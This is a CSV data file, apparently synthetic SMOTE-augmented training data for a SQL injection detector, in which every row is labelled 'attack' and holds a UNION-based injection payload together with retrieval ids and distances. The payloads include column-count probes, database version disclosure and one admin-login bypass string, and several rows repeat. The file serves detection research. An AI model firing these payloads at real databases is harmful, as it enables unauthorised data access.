id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000196,attack,union,"-1949  )   as smyn where 4066  =  4066 union all select 4066,4066--",nearest_attack_euclidean,R000276,0.4358677994657912
SMOTE_000197,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000532,0.09930991329491515
SMOTE_000198,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000132,0.42277687554714344
SMOTE_000199,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R000622,0.05857353031645617
SMOTE_000200,attack,union,"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",nearest_attack_euclidean,R000563,0.7631709468440926
SMOTE_000201,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000601,0.09728971200307265
SMOTE_000202,attack,union,"-6116""   )    )    union all select 3679,3679,3679,3679,3679,3679,3679--",nearest_attack_euclidean,R000536,0.3968374924775563
SMOTE_000203,attack,union,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",nearest_attack_euclidean,R000439,0.01753272053580033
SMOTE_000204,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000243,0.12240519008133909
SMOTE_000205,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000013,0.05934062529015673
SMOTE_000206,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000349,0.4261945961982415
SMOTE_000207,attack,union,"-7700%'  )   union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",nearest_attack_euclidean,R000343,0.8076565504512886
SMOTE_000208,attack,union,"1%""   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R000540,0.14493604534866253
SMOTE_000209,attack,union,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",nearest_attack_euclidean,R000128,0.4483262076265845
SMOTE_000210,attack,union,"-8981%""   )    )     )   union all select 4538,4538,4538,4538,4538,4538,4538#",nearest_attack_euclidean,R000658,0.8013139465492215
SMOTE_000211,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.28792401737545714
SMOTE_000212,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000180,0.6629707776926669
SMOTE_000213,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000761,1.3052591983153814
SMOTE_000214,attack,union,"1""  )   as xsgx where 5239  =  5239 union all select null,null--",nearest_attack_euclidean,R000473,0.10277895271024216
SMOTE_000215,attack,union,"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",nearest_attack_euclidean,R000557,0.5787099631041682
SMOTE_000216,attack,union,"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",nearest_attack_euclidean,R000367,0.08093423227050203
SMOTE_000217,attack,union,"-5802'   )    )     )   union all select 6286,6286,6286,6286#",nearest_attack_euclidean,R000384,0.35811512342396207
SMOTE_000218,attack,union,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",nearest_attack_euclidean,R000475,0.3016066278427935
SMOTE_000219,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000454,0.07647862780869975
SMOTE_000220,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000180,0.4677905832149604
SMOTE_000221,attack,union,"1  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000676,0.4554594092232082
SMOTE_000222,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000325,0.1182521496046713
SMOTE_000223,attack,union,"-4705' where 2029  =  2029 union all select 2029,2029,2029#",nearest_attack_euclidean,R000348,0.7231339738335982
SMOTE_000224,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000699,0.03839428253887961
SMOTE_000225,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000203,0.6304573366381784
SMOTE_000226,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000652,0.2874744143490356
SMOTE_000227,attack,union,"-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",nearest_attack_euclidean,R000543,0.3058855608002696
SMOTE_000228,attack,union,"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",nearest_attack_euclidean,R000256,0.3017466570343865
SMOTE_000229,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000582,0.8444535251036773
SMOTE_000230,attack,union,"-7544""   )    )    union all select 3808,3808,3808,3808--",nearest_attack_euclidean,R000452,0.05358377191540956
SMOTE_000231,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000268,0.143857597293322
SMOTE_000232,attack,union,"-2384%'   )    )    union all select 2467,2467,2467,2467#",nearest_attack_euclidean,R000458,0.19646152857963797
SMOTE_000233,attack,union,"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000753,0.27790730172837214
SMOTE_000234,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000158,0.5362737784428285
SMOTE_000235,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000568,0.7663904005898681
SMOTE_000236,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000319,0.18113531346179373
SMOTE_000237,attack,union,"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",nearest_attack_euclidean,R000259,0.4270027784652241
SMOTE_000238,attack,union,"-4135'   )    )     )   union all select 4413,4413,4413#",nearest_attack_euclidean,R000712,0.6593551435710372
SMOTE_000239,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000639,0.42928219605721174
SMOTE_000240,attack,union,"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#",nearest_attack_euclidean,R000502,1.0357807294848567
SMOTE_000241,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000425,0.7141819866860342
SMOTE_000242,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R000709,0.08490253590502789
SMOTE_000243,attack,union,"-5169""   )    )    union all select 6198,6198,6198,6198--",nearest_attack_euclidean,R000644,0.011540667921856117
SMOTE_000244,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000561,0.0010936402769430073
SMOTE_000245,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,0.0428515833906734
SMOTE_000246,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,0.04595321438909907
SMOTE_000247,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.020270607243919592
SMOTE_000248,attack,union,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",nearest_attack_euclidean,R000412,0.9707258666206918
SMOTE_000249,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000325,0.46178834986773626
SMOTE_000250,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000758,0.6085400256547255
SMOTE_000251,attack,union,"1%' union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000171,0.34965979314572226
SMOTE_000252,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000596,0.6043814226004648
SMOTE_000253,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000112,0.13385620462378806
SMOTE_000254,attack,union," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000018,0.44512658730154087
SMOTE_000255,attack,union,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",nearest_attack_euclidean,R000496,0.0813160467114768
SMOTE_000256,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000729,0.7171262333396141
SMOTE_000257,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,2.384185791015625e-07
SMOTE_000258,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000225,0.10769897173387809
SMOTE_000259,attack,union,"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",nearest_attack_euclidean,R000563,0.23899444941491987
SMOTE_000260,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000425,0.24609942244301808
SMOTE_000261,attack,union,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",nearest_attack_euclidean,R000228,0.4039959484023377
SMOTE_000262,attack,union,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",nearest_attack_euclidean,R000197,0.0027955148037605
SMOTE_000263,attack,union,"1%""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000130,0.04380086267389918
SMOTE_000264,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R000204,0.27949124768667744
SMOTE_000265,attack,union,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",nearest_attack_euclidean,R000393,0.953003587586969
SMOTE_000266,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000175,0.018895897354767387
SMOTE_000267,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000081,0.009794611172625128
SMOTE_000268,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.12754844461484802
SMOTE_000269,attack,union,"1"" union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000273,0.05371785334220704
SMOTE_000270,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000639,0.8928055131231296
SMOTE_000271,attack,union,"1%"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000690,0.44233093135136553
SMOTE_000272,attack,union,"1""  )   as xsgx where 5239  =  5239 union all select null,null--",nearest_attack_euclidean,R000473,0.22605581545214082
SMOTE_000273,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000077,0.3039770333424836
SMOTE_000274,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000218,0.588555894862672
SMOTE_000275,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000271,0.06292642775519519
SMOTE_000276,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000297,0.0636681283117325
SMOTE_000277,attack,union,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",nearest_attack_euclidean,R000352,0.8697174941272076
SMOTE_000278,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000425,0.08118495381924462
SMOTE_000279,attack,union," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",nearest_attack_euclidean,R000084,0.24073498896464549
SMOTE_000280,attack,union,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",nearest_attack_euclidean,R000439,0.009147047731632175
SMOTE_000281,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000462,0.39652868827115734
SMOTE_000282,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000667,0.30893074503209406
SMOTE_000283,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000270,0.2879292906329449
SMOTE_000284,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000370,0.8190562105915236
SMOTE_000285,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000243,0.44521713824265147
SMOTE_000286,attack,union,"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",nearest_attack_euclidean,R000771,0.4476263402436536
SMOTE_000287,attack,union,"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",nearest_attack_euclidean,R000493,0.9614886212015828
SMOTE_000288,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000373,0.26771004263620496
SMOTE_000289,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000237,0.3390469767731912
SMOTE_000290,attack,union,"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",nearest_attack_euclidean,R000174,0.23863787467668776
SMOTE_000291,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,1.0314404034261295
SMOTE_000292,attack,union,"1   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000375,0.21489035561148312
SMOTE_000293,attack,union,"1%'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000660,0.4674484708816787
SMOTE_000294,attack,union," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.3472987468357937
SMOTE_000295,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000429,0.11069102240538828
SMOTE_000296,attack,union,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",nearest_attack_euclidean,R000211,0.3801055606151139
SMOTE_000297,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000313,0.23893251069165447
SMOTE_000298,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000202,0.45114214931517194
SMOTE_000299,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000270,0.7590189200252472
SMOTE_000300,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000559,1.2086069613663957
SMOTE_000301,attack,union,"1'  )   where 5276  =  5276 union all select null,null--",nearest_attack_euclidean,R000635,0.20630865033787654
SMOTE_000302,attack,union,"1  )   as zdym where 1578  =  1578 union all select null,null,null#",nearest_attack_euclidean,R000575,0.016781122302992967
SMOTE_000303,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000345,0.17530081451583915
SMOTE_000304,attack,union,-4331  )   as inpx where 9804  =  9804 union all select 9804#,nearest_attack_euclidean,R000329,0.944637558484756
SMOTE_000305,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000431,0.4111016193070434
SMOTE_000306,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000381,1.060887205101696
SMOTE_000307,attack,union,-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,nearest_attack_euclidean,R000531,0.10444819056794186
SMOTE_000308,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000577,0.023615168838210184
SMOTE_000309,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000666,0.2586784718948017
SMOTE_000310,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000260,0.38058887561279897
SMOTE_000311,attack,union,"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",nearest_attack_euclidean,R000780,0.11065247368965127
SMOTE_000312,attack,union,-8521'+  (  select ucim where 9003  =  9003 union all select 9003--,nearest_attack_euclidean,R000733,0.3065320419785816
SMOTE_000313,attack,union,"-9896""   )    )     )   union all select 4073,4073,4073,4073,4073#",nearest_attack_euclidean,R000696,0.19608286533882877
SMOTE_000314,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000050,0.10943320337962904
SMOTE_000315,attack,union,"-3177'   )    )    union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",nearest_attack_euclidean,R000398,0.38942873212303825
SMOTE_000316,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.0
SMOTE_000317,attack,union,"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",nearest_attack_euclidean,R000212,0.38634161427627967
SMOTE_000318,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000441,0.014041587998618472
SMOTE_000319,attack,union,"1  )   where 5232  =  5232 union all select null,null,null#",nearest_attack_euclidean,R000278,0.2319718488829445
SMOTE_000320,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000180,0.6111244741257147
SMOTE_000321,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000772,0.9334380822110093
SMOTE_000322,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000123,0.19102503971234291
SMOTE_000323,attack,union,"1   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000750,0.0533441291596121
SMOTE_000324,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000741,0.6216003365188784
SMOTE_000325,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000667,0.18604272929647064
SMOTE_000326,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000396,0.630427543519018
SMOTE_000327,attack,union,"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",nearest_attack_euclidean,R000562,0.12508992328576762
SMOTE_000328,attack,union,-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,nearest_attack_euclidean,R000245,9.488290177953756
SMOTE_000329,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000589,0.08098472630728726
SMOTE_000330,attack,union,"1""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000119,0.29416100687714314
SMOTE_000331,attack,union,"1""  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000518,0.030076871462933617
SMOTE_000332,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000718,0.18718272076415632
SMOTE_000333,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000469,0.4167499077944014
SMOTE_000334,attack,union,"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",nearest_attack_euclidean,R000350,9.95610898310447
SMOTE_000335,attack,union,"1'   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R000312,0.78952174729838
SMOTE_000336,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R000204,0.41998495388629653
SMOTE_000337,attack,union,"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000544,0.1579120643405281
SMOTE_000338,attack,union,"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",nearest_attack_euclidean,R000173,0.27404757762720644
SMOTE_000339,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000269,0.46054932787815206
SMOTE_000340,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000386,0.22452490337742
SMOTE_000341,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000138,0.6658505808140716
SMOTE_000342,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000235,0.2394240435131509
SMOTE_000343,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R000221,0.758965640490659
SMOTE_000344,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000347,0.12863426453787555
SMOTE_000345,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000598,0.5394655358775505
SMOTE_000346,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000240,0.07465698800586759
SMOTE_000347,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000260,0.2584513715525903
SMOTE_000348,attack,union,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",nearest_attack_euclidean,R000437,0.35895783492181804
SMOTE_000349,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000006,0.09289068335436713
SMOTE_000350,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000521,0.0020041534521477097
SMOTE_000351,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000149,1.2179207480568535
SMOTE_000352,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000489,0.11812243027877617
SMOTE_000353,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000057,0.00308705584146884
SMOTE_000354,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000219,0.43475674729811736
SMOTE_000355,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000251,1.2749305366508774
SMOTE_000356,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000316,0.6685384435111796
SMOTE_000357,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000053,0.15047040722554963
SMOTE_000358,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000612,0.7817118332744547
SMOTE_000359,attack,union," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000036,0.09514076890809828
SMOTE_000360,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000527,0.6515249286153199
SMOTE_000361,attack,union," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",nearest_attack_euclidean,R000032,0.2617108581269354
SMOTE_000362,attack,union,"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",nearest_attack_euclidean,R000618,0.10954999425061353
SMOTE_000363,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000631,0.34748463114750333
SMOTE_000364,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000770,0.29456888031604095
SMOTE_000365,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000582,0.46976905402206565
SMOTE_000366,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000268,0.2756608660763655
SMOTE_000367,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000202,0.3782125738816034
SMOTE_000368,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000485,0.36005262750860534
SMOTE_000369,attack,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",nearest_attack_euclidean,R000734,0.2576865852159943
SMOTE_000370,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R000221,0.487624922968914
SMOTE_000371,attack,union,"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",nearest_attack_euclidean,R000350,0.1793604994743463
SMOTE_000372,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000419,0.08051025801914118
SMOTE_000373,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000302,0.2924353808299909
SMOTE_000374,attack,union,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000265,0.0956854409499261
SMOTE_000375,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000022,0.03337280650058448
SMOTE_000376,attack,union,"1%""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000130,0.7135864832702248
SMOTE_000377,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,9.217732691007733
SMOTE_000378,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000234,0.06801976781611395
SMOTE_000379,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000428,0.2743418295395257
SMOTE_000380,attack,union,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",nearest_attack_euclidean,R000517,0.5586662544207923
SMOTE_000381,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000071,0.2742700641572896
SMOTE_000382,attack,union,"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",nearest_attack_euclidean,R000682,1.0781408269293984
SMOTE_000383,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000528,0.4266646455864257
SMOTE_000384,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000417,0.4153888035610634
SMOTE_000385,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.10571159712200938
SMOTE_000386,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000630,0.8903553077619616
SMOTE_000387,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000444,0.2828139541816246
SMOTE_000388,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000149,0.7825974994500302
SMOTE_000389,attack,union,"-3126   )    )    union all select 6718,6718,6718,6718,6718--",nearest_attack_euclidean,R000404,0.6872812152738027
